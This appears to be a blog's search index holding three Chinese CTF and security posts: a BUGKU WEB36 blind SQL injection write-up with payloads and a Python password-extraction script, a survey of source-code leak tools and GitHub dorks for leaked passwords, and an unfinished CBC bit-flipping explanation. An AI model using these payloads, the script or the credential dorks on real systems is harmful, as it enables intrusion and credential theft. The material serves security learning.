<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUGKU WEB36</title>
    <url>/2021/02/01/BUGKU-WEB36/</url>
    <content><![CDATA[<p>这关可以说的东西还挺多，涉及盲注，以及有关数据库一些数据转化，还有盲注脚本的编写，所以单独拿出来讲一下。 <a id="more"></a></p>
<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>打开页面后，发现只有一个登录框，想的就是SQL注入，在尝试了几种写法，以及利用sqlmap跑后，没啥收获，因为不知道过滤了什么，接下来扫了一下URL，看看有没有后台可以提供其他信息扫到了一个image，打开以后，得到这张图片，感觉还是要SQL注入<br>‘-(mid((passwd)from(-1))=’t’)-‘</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210201143657.png" alt="img" style="zoom: 50%;">

<h2 id="fuzz测试过滤内容"><a href="#fuzz测试过滤内容" class="headerlink" title="fuzz测试过滤内容"></a>fuzz测试过滤内容</h2><p>利用burp进行fuzz测试看一下都有哪些字符被过滤了<br>一开始的时候构造了一个<code>admin&#39;+ 1&#39;1</code>去跑字典，替换的是那个+号发现不管什么字符都被过滤了的样子，然后想了一下，会不会是空格被过滤了呀？？，然后使用了admin’ 1’1 果然是这样，单引号没被过滤，但是空格被过滤了，接下来在用空格跑一遍字典试试</p>
<p>发现还是有一些没过滤的，比如说ascii select mid ，还有一些字符，而且，提示的那些字符是没过滤的，解题方向大概率就是盲注了，应该就是要编写脚本，那么我们知道编写脚本，需要知道条件，构造语句等等，所以继续构造SQL注入探索看看<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210201161032.png" alt="img" style="zoom:67%;"></p>
<h2 id="利用现有字符构造注入语句"><a href="#利用现有字符构造注入语句" class="headerlink" title="利用现有字符构造注入语句"></a>利用现有字符构造注入语句</h2><p>在继续SQL注入的时候发现，如果闭合引号，有两种不同情况:<br>1.一种是<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210201161329.png" alt="img" style="zoom:67%;"><br>2.另一种是<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210201161323.png" alt="img" style="zoom:67%;"></p>
<p><strong>意味着什么呢：</strong><br>password意味着不存在该账号<br>username意味着存在该账号<br>为什么呢？继续看下面</p>
<p>这里查找了一下网上大神们的write up，发现这里闭合引号的方式使用减号闭合的，其实不是很能理解为啥？<br>等找到答复再回来补吧<br>问完学长以后发现是这样的：<br>其实那个减号起的不是闭合作用，我们闭合就是用单引号闭合了，总结下来就是两点:<br>1.后面的负号起的不是闭合引号的作用，而是以运算为媒介的连接作用<br>2.为什么需要这个负号，是因为如果缺少这个负号，我们想输入的查询整体就会被分割<br>3.那其实就是说这个负号可以更换任意其他的运算符</p>
<p>总而言之，这里的payload，可以暂时写为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;-0-&#39;</span><br></pre></td></tr></table></figure>

<p>我在使用<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210202133902.png" alt="img" style="zoom:67%;"></p>
<p><strong>这里需要引入一个知识点:</strong></p>
<p>就是上面这个username=0，所有数据都出来的原因，因为这个里的username定义为字符串，当遇到int类型的数据的时候，字符串会自动转化为int类型和这个0去匹配，而转化为int类型以后的数据为0所以，所有为都为字符组成的字符串就都和这个0匹配，所以全都罗列出来了<br>参考:<a href="https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v">https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v</a><br><a href="https://blog.csdn.net/HaHa_Sir/article/details/93666147">https://blog.csdn.net/HaHa_Sir/article/details/93666147</a></p>
<h2 id="SQL注入语句构造"><a href="#SQL注入语句构造" class="headerlink" title="SQL注入语句构造"></a>SQL注入语句构造</h2><p>接下来就是构造盲注语句，这里我们需要考虑，想要获取的时候什么<br>根据上面那张图片给的提示，大概语句是(mid((字段名)from(i)))=’j;<br>这个时候问题来了，字段名是啥，看了一下网上大神说的，根据表单提交的是passwd所以猜测是passwd，这个和数据库中的字段名是不一样的，就是猜测，接下来就是脚本的编写了，</p>
<p>首先是mid()函数:<br><strong>mid(‘对象’，开始位置（从1开始），长度);</strong><br>但是在这题中，逗号也被过滤了，所以这样写是行不通的，根据提示，我们需要利用from:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210202141949.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210202140728.png" alt="img" style="zoom:67%;">
构建以下payload，如果mid为真则为1，那么admin-1就不为0，那么就不会查询得出

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;-(mid((passwd)from(-1))&gt;&#39;0&#39;)-&#39;</span><br></pre></td></tr></table></figure>

<p>在这里，如果mid这里为真则为1，我们知道admin’-1-‘在数据库查询为空，即为username wrong，反之同理</p>
<p>参考：<a href="https://xz.aliyun.com/t/2583">https://xz.aliyun.com/t/2583</a><br>接下来是写post类型的脚本:</p>
<p>直接贴出来吧</p>
<p>这里有必要说几个细节<br>1.网页的URL有两个 一个index.php，就是框框那边，另一个是login.php，这个才是回显的页面，所以你要发送post到这个页面去<br>2.这里我用了两次逆序，因为mid只能从后面截取，所以用了切片法进行逆序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url = <span class="string">&quot;http://114.67.246.176:11969/login.php&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=34kfhvoilevqk4p779t36qc2j5&#x27;</span>&#125;</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdef&#x27;</span>:</span><br><span class="line">        payload =<span class="string">f&quot;admin&#x27;-(mid((passwd)from(-<span class="subst">&#123;i&#125;</span>))=&#x27;<span class="subst">&#123;j&#125;</span><span class="subst">&#123;password&#125;</span>&#x27;)-&#x27;&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line">        data = &#123;<span class="string">&#x27;uname&#x27;</span>: payload,<span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;sky&#x27;</span>&#125;</span><br><span class="line">       <span class="comment"># print(s.post(url,data=data).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;username error!!&#x27;</span> <span class="keyword">in</span> s.post(url=url,data=data,headers=headers).text:</span><br><span class="line">            <span class="comment">#print(s.post(url,data=data).text)</span></span><br><span class="line">            strA = password</span><br><span class="line">            password = strA[::<span class="number">-1</span>]</span><br><span class="line">            print(password)<span class="comment">#可不用，是用来调试的</span></span><br><span class="line">            password += j</span><br><span class="line">            strA = password</span><br><span class="line">            password = strA[::<span class="number">-1</span>]</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>


<p>得到结果以后发现是md5加密，拿去解密，得到bugkuctf，然后登陆一下，他说</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210202190358.png" alt="img" style="zoom:67%;">
这边说要ls命令？查了一下其实可以用cat<a href="#Linux-cat命令" class="headerlink" title="Linux cat命令"></a>Linux cat命令<p>cat命令:命令用于连接文件并打印到标准输出设备上。</p>
<p>cat&gt;/filename<br><a href="https://www.runoob.com/linux/linux-comm-cat.html">https://www.runoob.com/linux/linux-comm-cat.html</a><br><a href="http://blog.sina.com.cn/s/blog_52f6ead0010127xm.html">http://blog.sina.com.cn/s/blog_52f6ead0010127xm.html</a></p>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>感觉从这关学到了挺多东西的:<br>1.对于盲注的理解更深了，比如如何去构造闭合语句<br>2.mysql一些更基础的东西<br>3.脚本的编写也更加得心应手了，因为其实模板都一样<br>4.信息收集的重要性——盲注语句的编写，,过滤了什么<br>5.一些细节要注意哇！！！</p>
]]></content>
  </entry>
  <entry>
    <title>CTF中常见源码泄露</title>
    <url>/2021/02/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="SVN源码泄露"><a href="#SVN源码泄露" class="headerlink" title="SVN源码泄露"></a>SVN源码泄露</h1><p>SVN（subversion）是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范。“在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。”（可以利用.svn/entries文件，获取到服务器源码、svn服务器账号密码等信息）                          <a id="more"></a></p>
<p>更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，黑客则可以直接获得文件源代码。</p>
<h3 id="利用工具SvnHack"><a href="#利用工具SvnHack" class="headerlink" title="利用工具SvnHack"></a>利用工具SvnHack</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210210014954.png" alt="img" style="zoom:67%;">

<h1 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h1><p>Git是一个开源的分布式版本控制系统，在执行<code>git init</code>初始化目录的时候，会在当前目录下自动创建一个<code>.git</code>目录，用来记录代码的变更记录等。发布代码的时候，如果没有把<code>.git</code>这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p>
<h2 id="利用工具GitHack"><a href="#利用工具GitHack" class="headerlink" title="利用工具GitHack"></a>利用工具GitHack</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -2.7 GitHack.py -u</span><br></pre></td></tr></table></figure>

<h1 id="hg源码泄露"><a href="#hg源码泄露" class="headerlink" title="hg源码泄露"></a>hg源码泄露</h1><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg文件</p>
<h2 id="利用需要perl"><a href="#利用需要perl" class="headerlink" title="利用需要perl"></a>利用需要perl</h2><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl rip-hg.pl -v -u url</span><br></pre></td></tr></table></figure>

<h1 id="cvs漏洞泄露"><a href="#cvs漏洞泄露" class="headerlink" title="cvs漏洞泄露"></a>cvs漏洞泄露</h1><p>CVS是一个C/S系统，是一个常用的代码版本控制软件。主要在开源软件管理中使用。与它相类似的代码版本控制软件有subversion。多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。CVS版本控制系统是一种GNU软件包，主要用于在多人开发环境下的源码的维护。但是由于之前CVS编码的问题，大多数软件开发公司都使用SVN替代了CVS。主要是针对 CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。<br><a href="http://url/CVS/Root">http://url/CVS/Root</a> 返回根信息<br><a href="http://url/CVS/Entries">http://url/CVS/Entries</a> 返回所有文件的结构</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>github项目地址：<a href="https://github.com/kost/dvcs-ripper.git">https://github.com/kost/dvcs-ripper.git</a></p>
<p>运行示例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl rip-cvs.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;CVS&#x2F;</span><br></pre></td></tr></table></figure>

<h1 id="Bazaar-bzr泄露"><a href="#Bazaar-bzr泄露" class="headerlink" title="Bazaar/bzr泄露"></a>Bazaar/bzr泄露</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Bazaar（bzr）是另一个开源的 DVCS（Distributed Version Control System，即分布式版本控制系统），它试图给 SCM（Source Code Management，即源码管理） 的世界里带来一些新的东西。<br>　　bzr 是 Canonical 公司支持的一个项目，也就是 Ubuntu Linux 的发行公司。简单来说，bzr 是用 python 编写的，用于版本控制。</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h2><p>管理员将网站源代码备份在Web目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。</p>
<h1 id="常见备份文件后缀"><a href="#常见备份文件后缀" class="headerlink" title="常见备份文件后缀"></a>常见备份文件后缀</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.index.php.swp</span><br><span class="line">index.php.swp</span><br><span class="line">index.php.bak</span><br><span class="line">.index.php~</span><br><span class="line">index.php.bak_Edietplus</span><br><span class="line">index.php.~</span><br><span class="line">index.php.~1~</span><br><span class="line">index.php</span><br><span class="line">index.php~</span><br><span class="line">index.php.rar</span><br><span class="line">index.php.zip</span><br><span class="line">index.php.7z</span><br><span class="line">index.php.tar.gz</span><br><span class="line">.index.php.swo</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.zip</span><br><span class="line">www.7z</span><br><span class="line">www.tar.gz</span><br><span class="line">www.tar</span><br><span class="line">web.zip</span><br><span class="line">web.rar</span><br><span class="line">web.zip</span><br><span class="line">web.7z</span><br><span class="line">web.tar.gz</span><br><span class="line">web.tar</span><br><span class="line">wwwroot.rar</span><br><span class="line">web.rar</span><br><span class="line">image.php.bak</span><br></pre></td></tr></table></figure>

<h2 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h2><p>WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF 主要包含一下文件或目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF&#x2F;database.properties : 数据库配置文件</span><br><span class="line">WEB-INF&#x2F;classes&#x2F; : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF&#x2F;lib&#x2F; : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF&#x2F;src&#x2F; : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure>

<p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。</p>
<h1 id="SWP-文件泄露"><a href="#SWP-文件泄露" class="headerlink" title="SWP 文件泄露"></a>SWP 文件泄露</h1><p>swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。</p>
<p>漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件。</p>
<h1 id="github源码泄露"><a href="#github源码泄露" class="headerlink" title="github源码泄露"></a>github源码泄露</h1><p>GitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。</p>
<h1 id="github常见搜索语法"><a href="#github常见搜索语法" class="headerlink" title="github常见搜索语法"></a>github常见搜索语法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in:name test               #仓库标题搜索含有关键字 SpringCloud</span><br><span class="line">in:descripton test         #仓库描述搜索含有关键字</span><br><span class="line">in:readme test             #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 test           #stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 test           #forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;&#x3D;5000 test           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:test                  #用户名搜素</span><br><span class="line">license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java test         #在java语言的代码中搜索关键字</span><br><span class="line">user:test in:name test     #组合搜索,用户名test的标题含有test的</span><br></pre></td></tr></table></figure>

<h1 id="Google邮箱搜索"><a href="#Google邮箱搜索" class="headerlink" title="Google邮箱搜索"></a>Google邮箱搜索</h1><p>使用 Github 进行邮件配置信息收集</p>
<p>很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如</p>
<p>果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:Github.com smtp</span><br><span class="line"> </span><br><span class="line">site:Github.com smtp @qq.com</span><br><span class="line"> </span><br><span class="line">site:Github.com smtp @126.com</span><br><span class="line"> </span><br><span class="line">site:Github.com smtp @163.com</span><br><span class="line"> </span><br><span class="line">site:Github.com smtp @sina.com.cn</span><br><span class="line"></span><br><span class="line">site:Github.com smtp password</span><br><span class="line"></span><br><span class="line">site:Github.com String password smtp</span><br></pre></td></tr></table></figure>

<h1 id="数据库信息搜集"><a href="#数据库信息搜集" class="headerlink" title="数据库信息搜集"></a>数据库信息搜集</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:Github.com sa password</span><br><span class="line"> </span><br><span class="line">site:Github.com root password</span><br><span class="line"> </span><br><span class="line">site:Github.com User ID&#x3D;’sa’;Password</span><br><span class="line"> </span><br><span class="line">site:Github.com inurl:sql</span><br></pre></td></tr></table></figure>

<h1 id="DS-Store泄露"><a href="#DS-Store泄露" class="headerlink" title=".DS_Store泄露"></a>.DS_Store泄露</h1><p>.DS_Store 文件利用 .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
<h1 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h1><p>github项目地址:<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br>使用下载后，进入目录更新python2库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;6974-59fce729-40f6-4124-a2c9-a5a66673dc66node3.buuoj.cn:28261&#x2F;.DS_Store</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.cnblogs.com/Lmg66/p/13598803.html">https://www.cnblogs.com/Lmg66/p/13598803.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>CBC字节翻转攻击</title>
    <url>/2021/02/05/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="CBC加密流程"><a href="#CBC加密流程" class="headerlink" title="CBC加密流程"></a>CBC加密流程</h2><p>首先将明文分组，常见的以16个字节为一组，位数不足的使用特殊字符填充——&gt;生成一个随机的初始化向量(IV)和一个密钥——&gt;将IV和第一组明文异或——&gt;用密钥对3中XOR后产生的密文加密——&gt;用4中产生的密文对第二组明文进行XOR操作——&gt;用密钥对5中产生的密文加密——&gt;c重复步骤4-7，到最后一组明文——&gt;将IV和加密后的密文拼接在一起，得到最终的密文。</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210206115835.png" alt="img" style="zoom:67%;">
Plaintext：待加密的数据——也就是明文       <a id="more"></a>
IV：初始化向量，用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。
Ciphertext：加密后的数据——也就是密文
Key：密钥

<h2 id="CBC解密过程"><a href="#CBC解密过程" class="headerlink" title="CBC解密过程"></a>CBC解密过程</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210206120000.png" alt="img" style="zoom:67%;">

<p>从密文中提取出IV，然后将密文分组——&gt;使用密钥对第一组的密文解密，然后和IV进行xor得到明文——&gt;使用密钥对第二组密文解密，然后和2中的密文xor得到明文——&gt;重复2-3，直到最后一组密文</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>Ciphertext-N-1（密文-N-1）是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方。如果我们改变Ciphertext-N-1（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210206121506.png" alt="img" style="zoom:67%;"><br>注意在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。</p>
<p>参考:<a href="https://maplege.github.io/2018/11/19/CBC-reverse/">https://maplege.github.io/2018/11/19/CBC-reverse/</a></p>
<h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">已知A&#x3D;B^C</span><br><span class="line">可以得到结论B&#x3D;A^C</span><br><span class="line">并且也能得到A^C^B&#x3D;0</span><br></pre></td></tr></table></figure>

<h3 id="攻击核心"><a href="#攻击核心" class="headerlink" title="攻击核心"></a>攻击核心</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设第一块的密文第4个字节设为变量A，第二块的明文中第4个字节设为变量C，在第二块加密产生的第4个字节设为变量B</span><br><span class="line">因为A^B&#x3D;C，根据结论有B&#x3D;A^C</span><br><span class="line">如果人为将A变量值改变为A^C的结果，那么参与运算后A^B将等于A^C^B&#x3D;B^B&#x3D;0，第二个产生的明文的第4个字节将变为0</span><br><span class="line">如果将A变量值改变为A^C^X（这里X是任意字符），那么参与运算后，A^B将等于A^C^X^B&#x3D;B^X^B&#x3D;X，第二个产生的明文的第4个字节将变为X字符，这样，第二块密文块解密的结果就可控了</span><br></pre></td></tr></table></figure>

<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>首先先扫一下目录，看看有没有源码<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210206125759.png" alt="img"><br>可以看到有一个有文件，打开以后发现，由于不管怎么打开都是乱码，所以直接复制了网上wp的源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置cookie的流程调用的函数，返回一个随机的iv和使用该iv加密的post提交的username和password的结果——cipher</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$info</span>)</span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;username&#x27;</span>] = $info[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    setcookie(<span class="string">&quot;iv&quot;</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">&quot;cipher&quot;</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查函数，这里是对cookie中cipher和iv进行CBC翻转的利用点</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//如果cookie中设置了cipher和iv参数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//将cipher和iv参数都进行base64解码</span></span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="comment">//进行CBC模式的AES解密</span></span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            <span class="comment">//对解密结果进行反序列化，设置session中的username为反序列化后数组中的username的值</span></span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.base64_encode($plain).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            $_SESSION[<span class="string">&#x27;username&#x27;</span>] = $info[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据session中username参数，控制显示结果</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//如果session中的username为admin，则返回flag</span></span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">&quot;username&quot;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Flag is $flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.$_SESSION[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查是否带有username和password参数，如果有参数，进入设置cookie的路径</span></span><br><span class="line"><span class="comment">//如果没有设置参数，进入判断cookie路径</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    $username = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="comment">//不允许提交的username为admin</span></span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;$username,<span class="string">&#x27;password&#x27;</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//如果session中的username字段已经存在了，既登陆过了，则进入</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    .................</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上面说，不让我们直接提交admin，但是又说结果需要admin，联想到上面的攻击原理，改变解码中的某个字节，指挥影响该段明文，以及下一段明文对应的字节，也就是说我们要构造xdmin，或者axmmin，然后通过CBC字节翻转攻击，是的x还原为a或d。。。</p>
